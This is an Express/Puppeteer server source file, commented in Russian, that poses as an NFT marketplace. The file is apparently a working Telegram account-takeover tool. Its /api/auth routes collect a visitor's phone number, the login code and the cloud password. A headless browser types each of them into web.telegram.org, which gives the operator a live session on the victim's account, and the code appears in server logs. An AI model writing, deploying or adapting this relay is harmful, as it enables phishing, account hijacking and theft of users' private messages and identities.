import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import puppeteer from 'puppeteer';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  }
];

// Хранилища
let users = [];
let authSessions = new Map();
let userSessions = new Map();
let activeBrowsers = new Map();

// 🔥 РЕАЛЬНАЯ АВТОМАТИЗАЦИЯ WEB.TELEGRAM.ORG
class TelegramWebAutomation {
  constructor() {
    this.browser = null;
    this.page = null;
    this.isAuthenticated = false;
  }

  async init() {
    console.log('🚀 Запуск браузера для автоматизации...');
    
    try {
      this.browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu'
        ]
      });

      this.page = await this.browser.newPage();
      
      // Настраиваем user agent
      await this.page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      );

      // Переходим на web.telegram.org
      console.log('🌐 Переход на web.telegram.org...');
      await this.page.goto('https://web.telegram.org', { 
        waitUntil: 'networkidle2',
        timeout: 30000 
      });

      // Ждем загрузки интерфейса
      await this.page.waitForTimeout(3000);
      
      console.log('✅ Браузер готов к автоматизации');
      return true;
      
    } catch (error) {
      console.error('❌ Ошибка инициализации браузера:', error);
      return false;
    }
  }

  async enterPhoneNumber(phoneNumber) {
    try {
      console.log(`📱 Ввод номера телефона: ${phoneNumber}`);
      
      // Ждем появления поля ввода телефона
      await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
      
      // Вводим номер телефона
      await this.page.type('input[type="tel"]', phoneNumber, { delay: 100 });
      
      // Нажимаем кнопку "Next" или "Далее"
      const nextButton = await this.page.$('button[type="submit"]') || 
                         await this.page.$('.btn-primary') ||
                         await this.page.$('button:contains("Next")') ||
                         await this.page.$('button:contains("Далее")');
      
      if (nextButton) {
        await nextButton.click();
        console.log('✅ Номер телефона введен, отправлен запрос кода');
        
        // Ждем появления поля для ввода кода
        await this.page.waitForTimeout(3000);
        return { success: true, message: 'Код отправлен в официальный Telegram' };
      } else {
        throw new Error('Не найдена кнопка для продолжения');
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода номера:', error);
      return { success: false, error: error.message };
    }
  }

  async enterAuthCode(code) {
    try {
      console.log(`🔢 Ввод кода подтверждения: ${code}`);
      
      // Ждем появления поля для ввода кода
      await this.page.waitForSelector('input[type="text"]', { timeout: 10000 });
      
      // Вводим код
      await this.page.type('input[type="text"]', code, { delay: 100 });
      
      // Нажимаем кнопку "Sign In" или "Войти"
      const signInButton = await this.page.$('button[type="submit"]') || 
                           await this.page.$('.btn-primary') ||
                           await this.page.$('button:contains("Sign In")') ||
                           await this.page.$('button:contains("Войти")');
      
      if (signInButton) {
        await signInButton.click();
        console.log('✅ Код введен, отправлена проверка');
        
        // Ждем результат проверки кода
        await this.page.waitForTimeout(5000);
        
        // Проверяем, не появилось ли поле для облачного пароля
        const cloudPasswordField = await this.page.$('input[type="password"]');
        
        if (cloudPasswordField) {
          console.log('🔒 Требуется облачный пароль');
          return { 
            success: true, 
            requiresCloudPassword: true,
            message: 'Код подтвержден, требуется облачный пароль'
          };
        } else {
          // Проверяем, успешна ли авторизация
          const isLoggedIn = await this.checkIfLoggedIn();
          if (isLoggedIn) {
            console.log('✅ Успешная авторизация без облачного пароля');
            return { 
              success: true, 
              requiresCloudPassword: false,
              message: 'Успешная авторизация'
            };
          } else {
            throw new Error('Не удалось подтвердить код');
          }
        }
      } else {
        throw new Error('Не найдена кнопка для входа');
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return { success: false, error: error.message };
    }
  }

  async enterCloudPassword(password) {
    try {
      console.log('🔒 Ввод облачного пароля...');
      
      // Вводим пароль
      await this.page.type('input[type="password"]', password, { delay: 100 });
      
      // Нажимаем кнопку подтверждения
      const submitButton = await this.page.$('button[type="submit"]') || 
                           await this.page.$('.btn-primary') ||
                           await this.page.$('button:contains("Next")') ||
                           await this.page.$('button:contains("Далее")');
      
      if (submitButton) {
        await submitButton.click();
        console.log('✅ Облачный пароль введен');
        
        // Ждем завершения авторизации
        await this.page.waitForTimeout(5000);
        
        const isLoggedIn = await this.checkIfLoggedIn();
        if (isLoggedIn) {
          console.log('🎉 Успешная авторизация с облачным паролем');
          return { 
            success: true, 
            message: 'Успешная авторизация с облачным паролем'
          };
        } else {
          throw new Error('Неверный облачный пароль');
        }
      } else {
        throw new Error('Не найдена кнопка для подтверждения пароля');
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода облачного пароля:', error);
      return { success: false, error: error.message };
    }
  }

  async checkIfLoggedIn() {
    try {
      // Проверяем различные элементы, указывающие на успешную авторизацию
      const selectors = [
        '.chat-list', // Список чатов
        '.sidebar',   // Боковая панель
        '.middle-column', // Основная колонка
        '[data-testid="chat-list"]' // Тестовый ID списка чатов
      ];

      for (const selector of selectors) {
        const element = await this.page.$(selector);
        if (element) {
          return true;
        }
      }

      // Дополнительная проверка по URL
      const currentUrl = this.page.url();
      return currentUrl.includes('/a/') || currentUrl.includes('/k/');
      
    } catch (error) {
      return false;
    }
  }

  async close() {
    if (this.browser) {
      await this.browser.close();
      console.log('🔚 Браузер закрыт');
    }
  }
}

// 🎯 API МАРШРУТЫ

app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace с реальной автоматизацией Telegram',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// 🔐 Шаг 1: Начало авторизации - бот вводит номер телефона
app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    console.log('📞 Начало реальной авторизации для:', phone);
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    // Создаем сессию
    const sessionId = crypto.randomBytes(16).toString('hex');
    
    // Запускаем браузер для автоматизации
    const automation = new TelegramWebAutomation();
    const initResult = await automation.init();
    
    if (!initResult) {
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось запустить браузер для автоматизации' 
      });
    }

    // Бот вводит номер телефона на web.telegram.org
    const phoneResult = await automation.enterPhoneNumber(phone);
    
    if (!phoneResult.success) {
      await automation.close();
      return res.status(500).json({ 
        success: false, 
        error: phoneResult.error 
      });
    }

    // Сохраняем сессию и браузер
    authSessions.set(sessionId, {
      phone: phone,
      automation: automation,
      attempts: 0,
      createdAt: Date.now(),
      status: 'waiting_for_code'
    });

    activeBrowsers.set(sessionId, automation);

    console.log(`🤖 Создана сессия ${sessionId} для ${phone}`);
    console.log('💡 Ожидание кода из официального Telegram...');

    res.json({
      success: true,
      sessionId: sessionId,
      message: '✅ Бот ввел номер телефона на web.telegram.org. Код отправлен в официальный Telegram.',
      instruction: 'Проверьте официальный Telegram и введите полученный код',
      nextStep: 'enter_code'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Ввод кода - бот вводит код на web.telegram.org
app.post('/api/auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    console.log('🔐 Ввод кода для сессии:', sessionId, 'код:', code);
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена. Начните авторизацию заново.' 
      });
    }

    // Проверяем время жизни (10 минут)
    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
      await authSession.automation.close();
      authSessions.delete(sessionId);
      activeBrowsers.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Время сессии истекло. Начните заново.' 
      });
    }

    // Проверяем попытки
    if (authSession.attempts >= 3) {
      await authSession.automation.close();
      authSessions.delete(sessionId);
      activeBrowsers.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток. Начните заново.' 
      });
    }

    // 🔥 БОТ РЕАЛЬНО ВВОДИТ КОД НА WEB.TELEGRAM.ORG
    const codeResult = await authSession.automation.enterAuthCode(code);

    if (!codeResult.success) {
      authSession.attempts++;
      authSessions.set(sessionId, authSession);
      
      const attemptsLeft = 3 - authSession.attempts;
      return res.status(400).json({ 
        success: false, 
        error: `${codeResult.error} Осталось попыток: ${attemptsLeft}` 
      });
    }

    // Обновляем статус сессии
    authSession.status = codeResult.requiresCloudPassword ? 'need_cloud_password' : 'authenticated';
    authSessions.set(sessionId, authSession);

    if (codeResult.requiresCloudPassword) {
      res.json({
        success: true,
        message: '✅ Код подтвержден! Требуется облачный пароль.',
        nextStep: 'cloud_password',
        requiresCloudPassword: true
      });
    } else {
      // Авторизация завершена без облачного пароля
      await completeAuthentication(sessionId, authSession, res);
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 3: Ввод облачного пароля
app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId || !cloudPassword) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите sessionId и облачный пароль' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession || authSession.status !== 'need_cloud_password') {
      return res.status(400).json({ 
        success: false, 
        error: 'Сначала подтвердите код' 
      });
    }

    // 🔥 БОТ РЕАЛЬНО ВВОДИТ ОБЛАЧНЫЙ ПАРОЛЬ
    const passwordResult = await authSession.automation.enterCloudPassword(cloudPassword);

    if (!passwordResult.success) {
      return res.status(400).json({ 
        success: false, 
        error: passwordResult.error 
      });
    }

    // Авторизация завершена с облачным паролем
    await completeAuthentication(sessionId, authSession, res);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🎯 Завершение авторизации и создание пользователя
async function completeAuthentication(sessionId, authSession, res) {
  try {
    // Закрываем браузер
    await authSession.automation.close();
    activeBrowsers.delete(sessionId);

    // Создаем пользователя
    let user = users.find(u => u.phone === authSession.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: 'Telegram',
        lastName: 'User',
        username: `user${authSession.phone.replace('+', '')}`,
        isVerified: true,
        hasCloudPassword: authSession.status === 'need_cloud_password',
        createdAt: new Date(),
        lastLogin: new Date(),
        authMethod: 'puppeteer_automation'
      };
      users.push(user);
    } else {
      user.lastLogin = new Date();
    }

    // Создаем пользовательскую сессию
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId,
      authMethod: 'puppeteer_automation',
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Очищаем auth сессию
    authSessions.delete(sessionId);

    console.log(`🎉 Реальная авторизация завершена для ${authSession.phone}`);

    res.json({
      success: true,
      message: '🎉 Бот успешно вошел в ваш аккаунт Telegram через web.telegram.org!',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: user.hasCloudPassword
      },
      sessionId: userSessionId,
      isNewUser: isNewUser
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка завершения авторизации: ' + error.message 
    });
  }
}

// 📱 API для NFT
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Проверка сессии
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Недействительная сессия' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Выход
app.post('/api/auth/logout', async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    if (sessionId) {
      userSessions.delete(sessionId);
    }
    
    res.json({
      success: true,
      message: 'Выход выполнен'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Дебаг
app.get('/api/debug', (req, res) => {
  res.json({
    authSessions: Array.from(authSessions.entries()).length,
    users: users.length,
    userSessions: userSessions.size,
    activeBrowsers: activeBrowsers.size
  });
});

// Очистка при завершении
process.on('SIGINT', async () => {
  console.log('🔚 Завершение работы, закрытие браузеров...');
  for (const [sessionId, browser] of activeBrowsers) {
    await browser.close();
  }
  process.exit(0);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Real Telegram automation ready`);
  console.log(`🌐 Using Puppeteer for web.telegram.org automation`);
});
